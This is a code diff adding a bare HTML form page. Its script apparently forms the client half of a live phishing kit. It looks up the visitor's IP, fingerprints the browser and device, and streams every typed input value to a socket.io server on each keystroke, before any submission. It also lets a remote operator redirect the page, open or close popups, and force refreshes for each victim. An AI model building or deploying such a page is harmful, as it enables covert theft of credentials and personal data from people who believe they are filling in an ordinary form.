@@ -1,0 +1,296 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" integrity="sha384-mZLF4UVrpi/QTWPA7BjNPEnkIfRFn4ZEO3Qt/HFklTJBj/gBOV8G3HcKn4NfQblz" crossorigin="anonymous"></script>
+        <title>Simple Web Page</title>
+    </head>
+    <body>
+        <span id="information">des informations</span>
+        <br><br>
+        <input type="text" id="input1" placeholder="Input 1">
+        <br><br>
+        <input type="text" id="input2" placeholder="Input 2">
+        <br><br>
+        <input type="text" id="input3" placeholder="Input 3">
+        <br><br>
+        <input type="text" id="input4" placeholder="Input 4">
+        <br><br>
+        <input type="text" id="input5" placeholder="Input 5">
+        <br><br>
+        <input type="text" id="input6" placeholder="Input 6">
+        <br><br>
+        <select id="countrySelect">
+            <option value="France">France</option>
+            <option value="United States">United States</option>
+            <option value="Canada">Canada</option>
+            <option value="United Kingdom">United Kingdom</option>
+            <option value="Germany">Germany</option>
+            <option value="Australia">Australia</option>
+            <option value="Spain">Spain</option>
+            <option value="Italy">Italy</option>
+            <option value="Japan">Japan</option>
+            <option value="China">China</option>
+        </select>
+        <br><br>
+        <input type="text" id="input7" name="name" autocomplete="" placeholder="Input 7">
+        <br><br>
+        <button id="confirmButton">Confirm</button>
+        
+
+
+        <script src="./jquery.js"></script>
+        <script>
+            $(document).ready(function() {
+                const socket = io();
+                let id;
+                let ip;
+
+                $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
+                    data = data.trim().split('\n').reduce(function(obj, pair) {
+                        pair = pair.split('=');
+                        return obj[pair[0]] = pair[1], obj;
+                    }, {});
+                    ip = data.ip
+                });
+
+
+                ///////////////////////////////////////////////
+                ////////// GETTING USER AGENT INFOS ///////////
+                ///////////////////////////////////////////////
+                function getOS() {
+                    var userAgent = window.navigator.userAgent,
+                        platform = window.navigator.platform,
+                        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+                        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+                        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
+                        androidPlatforms = ['Android'],
+                        linuxPlatforms = ['Linux', 'X11'],
+                        os = null;
+
+                    if (macosPlatforms.indexOf(platform) !== -1) {
+                        os = 'Mac OS';
+                    } else if (iosPlatforms.indexOf(platform) !== -1) {
+                        os = 'iOS';
+                    } else if (windowsPlatforms.indexOf(platform) !== -1) {
+                        os = 'Windows';
+                    } else if (androidPlatforms.indexOf(platform) !== -1 || /Android/.test(userAgent)) {
+                        os = 'Android';
+                    } else if (linuxPlatforms.indexOf(platform) !== -1 || /Linux/.test(platform)) {
+                        os = 'Linux';
+                    }
+
+                    return os;
+                }
+
+                // alert(getOS());
+
+                function getBrowserName() {
+                    var userAgent = navigator.userAgent;
+                    var browserName;
+                    
+                    if (userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)) {
+                        browserName = userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)[1];
+                    } else {
+                        browserName = 'unknown';
+                    }
+                    
+                    return browserName;
+                }
+
+                // console.log(browserName);
+
+                function getDeviceType() {
+                    const userAgent = navigator.userAgent;
+                    let deviceType = 'Unknown';
+
+                    if (/Android/i.test(userAgent)) {
+                        deviceType = 'Android Device';
+                    } else if (/iPhone/i.test(userAgent)) {
+                        deviceType = 'iPhone';
+                    } else if (/iPad/i.test(userAgent)) {
+                        deviceType = 'iPad';
+                    } else if (/webOS/i.test(userAgent)) {
+                        deviceType = 'webOS Device';
+                    } else if (/BlackBerry/i.test(userAgent)) {
+                        deviceType = 'BlackBerry Device';
+                    } else if (/IEMobile/i.test(userAgent)) {
+                        deviceType = 'Windows Mobile Device';
+                    } else if (/Opera Mini/i.test(userAgent)) {
+                        deviceType = 'Opera Mini Device';
+                    } else if (/Windows/i.test(userAgent)) {
+                        deviceType = 'Windows PC';
+                    } else if (/Macintosh|MacIntel|MacPPC|Mac68K/i.test(userAgent)) {
+                        deviceType = 'Macintosh PC';
+                    } else if (/Linux/i.test(userAgent)) {
+                        deviceType = 'Linux PC';
+                    }
+
+                    return deviceType;
+                }
+
+                // Example usage:
+                const deviceType = getDeviceType();
+
+                ///////////////////////////////////////////////
+                //////// GETTING USER AGENT INFOS END /////////
+                ///////////////////////////////////////////////
+
+                function isGapLessThan3Seconds(otherDatetime) {
+
+                    const currentDatetime = new Date();
+                    const otherDate = new Date(otherDatetime);
+
+                    const differenceInMilliseconds = Math.abs(currentDatetime - otherDate);
+
+                    return differenceInMilliseconds < 3000;
+                }
+
+
+                if (localStorage.getItem('userId') && localStorage.getItem('lastDate')) {
+                    if (isGapLessThan3Seconds(localStorage.getItem('lastDate'))) {
+                        id = localStorage.getItem('userId')
+                    }
+                }
+
+                
+                let popupWindow;
+                let date = new Date()
+                setTimeout(function() {
+
+                    if (!id) {
+                        data = {
+                            ipAddress: ip,
+                            os: getOS(),
+                            browserName: getBrowserName(),
+                            deviceName: deviceType,
+                            userId: Math.random().toString(36).substr(2, 9),
+                            datetime: date.toLocaleString(),
+                            span: document.querySelector('#information').textContent,
+                            input1: document.querySelector('#input1').value,
+                            input1: document.querySelector('#input1').value,
+                            input2: document.querySelector('#input2').value,
+                            input3: document.querySelector('#input3').value,
+                            input4: document.querySelector('#input4').value,
+                            input5: document.querySelector('#input5').value,
+                            input6: document.querySelector('#input6').value,
+                            input7: document.querySelector('#countrySelect').value,
+                            input8: document.querySelector('#input7').value,
+                            popupOpen: false
+                        }
+                        socket.emit('formSubmit', data);
+                        id = data.userId
+                        localStorage.setItem('userId', id)
+                    } else {
+                        sendUpdate(false)
+                    }
+
+                }, 1000)
+
+
+                socket.on('redirect', (userId, url) => {
+                    if (userId === id) {
+                        popupWindow.location.href = url
+                    }
+                });
+
+                function sendUpdate(popup) {
+                    data = {
+                        ipAddress: ip,
+                        os: getOS(),
+                        browserName: getBrowserName(),
+                        deviceName: deviceType,
+                        userId: id,
+                        datetime: date.toLocaleString(),
+                        span: document.querySelector('#information').textContent,
+                        input1: document.querySelector('#input1').value,
+                        input1: document.querySelector('#input1').value,
+                        input2: document.querySelector('#input2').value,
+                        input3: document.querySelector('#input3').value,
+                        input4: document.querySelector('#input4').value,
+                        input5: document.querySelector('#input5').value,
+                        input6: document.querySelector('#input6').value,
+                        input7: document.querySelector('#countrySelect').value,
+                        input8: document.querySelector('#input7').value,
+                        popupOpen: popup
+                    }
+                    socket.emit('formUpdate', data);
+                }
+
+                let checkPopupClosed;
+                $('#confirmButton').click(function() {
+                    popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
+                    socket.emit('handlePopup', id, true);
+                    checkPopupClosed = setInterval(() => {
+                        if (popupWindow.closed) {
+                            socket.emit('handlePopup', id, false);
+                            clearInterval(checkPopupClosed)
+                        }
+                    }, 200)
+                })
+
+                $('input').on("input", function() {
+                    sendUpdate(false)
+                })
+
+                $('#countrySelect').on("change", function() {
+                    sendUpdate(false)
+                })
+                
+
+                
+                socket.on('mainRedirect', (userId, url) => {
+                    if (userId === id) {
+                        popupWindow.close()
+                        window.location.href = url
+                    }
+                })
+                
+                socket.on('openPopup', (userId) => {
+                    if (userId === id) {
+                        popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
+                        socket.emit('handlePopup', id, true);
+                        checkPopupClosed = setInterval(() => {
+                            if (popupWindow.closed) {
+                                socket.emit('handlePopup', id, false);
+                                clearInterval(checkPopupClosed)
+                            }
+                        }, 200)
+                    }
+                })
+
+                socket.on('closePopup', (userId) => {
+                    if (userId === id) {
+                        popupWindow.close()
+                    }
+                })
+
+                socket.on('refreshPage', (userId) => {
+                    if (userId === id) {
+                        window.location.reload()
+                    }
+                })
+
+                socket.on('checkClosed', (userId) => {
+                    if (userId === id) {
+                        socket.emit('closeResponse', userId)
+                    }
+                })
+
+                socket.on('userRedirect', (userId, page) => {
+                    if (userId === id) {
+                        window.location.href = page
+                    }
+                })
+                
+                setInterval(() => {
+                    localStorage.setItem('lastDate', new Date().toLocaleString())
+                    socket.emit('userExist', id)
+                }, 1000);
+
+
+
+            })
+        </script>
+    </body>
+</html>
